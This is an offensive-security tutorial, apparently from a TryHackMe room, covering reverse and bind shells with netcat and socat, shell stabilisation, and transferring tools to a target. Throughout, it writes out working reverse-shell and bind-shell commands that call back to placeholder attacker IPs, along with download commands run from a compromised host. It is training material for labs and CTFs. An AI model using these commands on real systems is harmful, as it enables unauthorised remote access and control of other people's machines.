# Types of Shell
At a high level, we are interested in two kinds of shell when it comes to exploiting a target: 
- Reverse shells
- Bind shells.

Reverse shells are when the target is forced to execute code that connects back to your computer. 
On your own computer you would use one of the tools mentioned in the previous task to set up a listener which would be used to receive the connection. 
Reverse shells are a good way to bypass firewall rules that may prevent you from connecting to arbitrary ports on the target; 
however, the drawback is that, when receiving a shell from a machine across the internet, you would need to configure your own network to accept the shell. 
This, however, will not be a problem on the TryHackMe network due to the method by which we connect into the network.
Bind shells are when the code executed on the target is used to start a listener attached to a shell directly on the target. 
This would then be opened up to the internet, meaning you can connect to the port that the code has opened and obtain remote code execution that way. 
This has the advantage of not requiring any configuration on your own network, but may be prevented by firewalls protecting the target.
As a general rule, reverse shells are easier to execute and debug, however, we will cover both examples below. Don't worry too much about the syntax here: 
we will be looking at it in upcoming tasks. Instead notice the difference between reverse and bind shells in the following simulations.

## Reverse Shell example:

Let's start with the more common reverse shell.

Nine times out of ten, this is what you'll be going for -- especially in CTF challenges like those of TryHackMe.

Take a look at the following image. On the left we have a reverse shell listener -- this is what receives the connection. 
On the right is a simulation of sending a reverse shell. 
In reality, this is more likely to be done through code injection on a remote website or something along those lines. 
Picture the image on the left as being your own computer, and the image on the right as being the target.

On the attacking machine:
sudo nc -lvnp 443

On the target:

nc <LOCAL-IP> <PORT> -e /bin/bash

Notice that after running the command on the right, the listener receives a connection. 
When the whoami command is run, we see that we are executing commands as the target user. 
The important thing here is that we are listening on our own attacking machine, and sending a connection from the target.

## Bind Shell example:
Bind shells are less common, but still very useful.

Once again, take a look at the following image. Again, on the left we have the attacker's computer, on the right we have a simulated target. Just to shake things up a little, we'll use a Windows target this time. First, we start a listener on the target -- this time we're also telling it to execute cmd.exe. Then, with the listener up and running, we connect from our own machine to the newly opened port.

On the target:

nc -lvnp <port> -e "cmd.exe"

On the attacking machine:

nc MACHINE_IP <port>

As you can see, this once again gives us code execution on the remote machine. Note that this is not specific to Windows.

The important thing to understand here is that we are listening on the target, then connecting to it with our own machine.

The final concept which is relevant in this task is that of interactivity. Shells can be either interactive or non-interactive.

Interactive: If you've used Powershell, Bash, Zsh, sh, or any other standard CLI environment then you will be used to
interactive shells. These allow you to interact with programs after executing them. For example, take the SSH login prompt:

Here you can see that it's asking interactively that the user type either yes or no in order to continue the connection.
This is an interactive program, which requires an interactive shell in order to run.


Non-Interactive shells don't give you that luxury. 
In a non-interactive shell you are limited to using programs which do not require user interaction in order to run properly. 
Unfortunately, the majority of simple reverse and bind shells are non-interactive, which can make further exploitation trickier. 
Let's see what happens when we try to run SSH in a non-interactive shell:

Notice that the whoami command (which is non-interactive) executes perfectly, but the ssh command (which is interactive) gives us no output at all. 
As an interesting side note, the output of an interactive command does go somewhere, however, figuring out where is an exercise for you to attempt on your own. 
Suffice to say that interactive programs do not work in non-interactive shells.
Additionally, in various places throughout this task you will see a command in the screenshots called listener. 
This command is an alias unique to the attacking machine used for demonstrations, and is a shorthand way of typing sudo rlwrap nc -lvnp 443, which will be covered in upcoming tasks. 
It will not work on any other machine unless the alias has been configured locally.

## Netcat
As mentioned previously, Netcat is the most basic tool in a pentester's toolkit when it comes to any kind of networking. 
With it we can do a wide variety of interesting things, but let's focus for now on shells.

### Reverse Shells

In the previous task we saw that reverse shells require shellcode and a listener. 
There are many ways to execute a shell, so we'll start by looking at listeners.
The syntax for starting a netcat listener using Linux is this:

nc -lvnp <port-number>

-l is used to tell netcat that this will be a listener
-v is used to request a verbose output
-n tells netcat not to resolve host names or use DNS. Explaining this is outwith the scope of the room.
-p indicates that the port specification will follow.
The example in the previous task used port 443. Realistically you could use any port you like, as long as there isn't already a service using it. 
Be aware that if you choose to use a port below 1024, you will need to use sudo when starting your listener. 
That said, it's often a good idea to use a well-known port number (80, 443 or 53 being good choices) as this is more likely to get past outbound firewall rules on the target.

A working example of this would be:

sudo nc -lvnp 443

We can then connect back to this with any number of payloads, depending on the environment on the target.

An example of this is displayed in the previous task.

### Bind Shells

If we are looking to obtain a bind shell on a target then we can assume that there is already a listener waiting for us on a chosen port of the target: 
all we need to do is connect to it. The syntax for this is relatively straight forward:

nc <target-ip> <chosen-port>

Here we are using netcat to make an outbound connection to the target on our chosen port.
We will look at using netcat to create a listener for this type of shell in Task 8. 
What's important here is that you understand how to connect to a listening port using netcat.

## Netcat Shell Stabilisation
Ok, so we've caught or connected to a netcat shell, what next?

These shells are very unstable by default. Pressing Ctrl + C kills the whole thing. 
They are non-interactive, and often have strange formatting errors. 
This is due to netcat "shells" really being processes running inside a terminal, rather than being bonafide terminals in their own right. 
Fortunately, there are many ways to stabilise netcat shells on Linux systems. We'll be looking at three here. 
Stabilisation of Windows reverse shells tends to be significantly harder;
however, the second technique that we'll be covering here is particularly useful for it.

### Technique 1: Python

The first technique we'll be discussing is applicable only to Linux boxes, as they will nearly always have Python installed by default. This is a three stage process:

The first thing to do is use python -c 'import pty;pty.spawn("/bin/bash")', which uses Python to spawn a better featured bash shell; note that some targets may need the version of Python specified. If this is the case, replace python with python2 or python3 as required. At this point our shell will look a bit prettier, but we still won't be able to use tab autocomplete or the arrow keys, and Ctrl + C will still kill the shell.
Step two is: export TERM=xterm -- this will give us access to term commands such as clear.
Finally (and most importantly) we will background the shell using Ctrl + Z. Back in our own terminal we use stty raw -echo; fg. 
This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). 
It then foregrounds the shell, thus completing the process.
The full technique can be seen here:


Note that if the shell dies, any input in your own terminal will not be visible (as a result of having disabled terminal echo). 
To fix this, type reset and press enter.

### Technique 2: rlwrap

rlwrap is a program which, in simple terms, gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell; however, some manual stabilisation must still be utilised if you want to be able to use Ctrl + C inside the shell. rlwrap is not installed by default on Kali, so first install it with sudo apt install rlwrap.

To use rlwrap, we invoke a slightly different listener:

rlwrap nc -lvnp <port>

Prepending our netcat listener with "rlwrap" gives us a much more fully featured shell. This technique is particularly useful when dealing with Windows shells, which are otherwise notoriously difficult to stabilise. When dealing with a Linux target, it's possible to completely stabilise, by using the same trick as in step three of the previous technique: background the shell with Ctrl + Z, then use stty raw -echo; fg to stabilise and re-enter the shell.

### Technique 3: Socat

The third easy way to stabilise a shell is quite simply to use an initial netcat shell as a stepping stone into a more fully-featured socat shell. 
Bear in mind that this technique is limited to Linux targets, as a Socat shell on Windows will be no more stable than a netcat shell. 
To accomplish this method of stabilisation we would first transfer a socat static compiled binary (a version of the program compiled to have no dependencies) up to the target machine. 
A typical way to achieve this would be using a webserver on the attacking machine inside the directory containing your socat binary (sudo python3 -m http.server 80), then, on the target machine, using the netcat shell to download the file. On Linux this would be accomplished with curl or wget (wget <LOCAL-IP>/socat -O /tmp/socat).

For the sake of completeness: in a Windows CLI environment the same can be done with Powershell, using either Invoke-WebRequest or a webrequest system class, 
depending on the version of Powershell installed (Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe). We will cover the syntax for sending and receiving shells with Socat in the upcoming tasks.

With any of the above techniques, it's useful to be able to change your terminal tty size. 
This is something that your terminal will do automatically when using a regular shell; 
however, it must be done manually in a reverse or bind shell if you want to use something like a text editor which overwrites everything on the screen.

First, open another terminal and run stty -a. This will give you a large stream of output. Note down the values for "rows" and columns:

Next, in your reverse/bind shell, type in:

stty rows <number>
and

stty cols <number>

Filling in the numbers you got from running the command in your own terminal.

This will change the registered width and height of the terminal, thus allowing programs such as text editors which rely on such information being accurate to correctly open.

## Socat
Socat is similar to netcat in some ways, but fundamentally different in many others. The easiest way to think about socat is as a connector between two points. In the interests of this room, this will essentially be a listening port and the keyboard, however, it could also be a listening port and a file, or indeed, two listening ports. All socat does is provide a link between two points -- much like the portal gun from the Portal games!

Once again, let's start with reverse shells.

Reverse Shells

As mentioned previously, the syntax for socat gets a lot harder than that of netcat. Here's the syntax for a basic reverse shell listener in socat:

socat TCP-L:<port> -

As always with socat, this is taking two points (a listening port, and standard input) and connecting them together. The resulting shell is unstable, but this will work on either Linux or Windows and is equivalent to nc -lvnp <port>.

On Windows we would use this command to connect back:

socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes

The "pipes" option is used to force powershell (or cmd.exe) to use Unix style standard input and output.

This is the equivalent command for a Linux Target:

socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"

Bind Shells

On a Linux target we would use the following command:

socat TCP-L:<PORT> EXEC:"bash -li"

On a Windows target we would use this command for our listener:

socat TCP-L:<PORT> EXEC:powershell.exe,pipes

We use the "pipes" argument to interface between the Unix and Windows ways of handling input and output in a CLI environment.

Regardless of the target, we use this command on our attacking machine to connect to the waiting listener.

socat TCP:<TARGET-IP>:<TARGET-PORT> -

Now let's take a look at one of the more powerful uses for Socat: a fully stable Linux tty reverse shell. This will only work when the target is Linux, but is significantly more stable. As mentioned earlier, socat is an incredibly versatile tool; however, the following technique is perhaps one of its most useful applications. Here is the new listener syntax:

socat TCP-L:<port> FILE:`tty`,raw,echo=0

Let's break this command down into its two parts. As usual, we're connecting two points together. In this case those points are a listening port, and a file. Specifically, we are passing in the current TTY as a file and setting the echo to be zero. This is approximately equivalent to using the Ctrl + Z, stty raw -echo; fg trick with a netcat shell -- with the added bonus of being immediately stable and hooking into a full tty.

The first listener can be connected to with any payload; however, this special listener must be activated with a very specific socat command.
This means that the target must have socat installed. Most machines do not have socat installed by default, however, it's possible to upload a precompiled socat binary, which can then be executed as normal.

The special command is as follows:

socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane

This is a handful, so let's break it down.

The first part is easy -- we're linking up with the listener running on our own machine. 
The second part of the command creates an interactive bash session with  EXEC:"bash -li". 
We're also passing the arguments: pty, stderr, sigint, setsid and sane:

pty, allocates a pseudoterminal on the target -- part of the stabilisation process
stderr, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)
sigint, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
setsid, creates the process in a new session
sane, stabilises the terminal, attempting to "normalise" it.
That's a lot to take in, so let's see it in action.

As normal, on the left we have a listener running on our local attacking machine, on the right we have a simulation of a compromised target, running with a non-interactive shell. 
Using the non-interactive netcat shell, we execute the special socat command, and receive a fully interactive bash shell on the socat listener to the left:

Note that the socat shell is fully interactive, allowing us to use interactive commands such as SSH. 
This can then be further improved by setting the stty values as seen in the previous task, which will let us use text editors such as Vim or Nano.

If, at any point, a socat shell is not working correctly, it's well worth increasing the verbosity by adding -d -d into the command. 
This is very useful for experimental purposes, but is not usually necessary for general use.

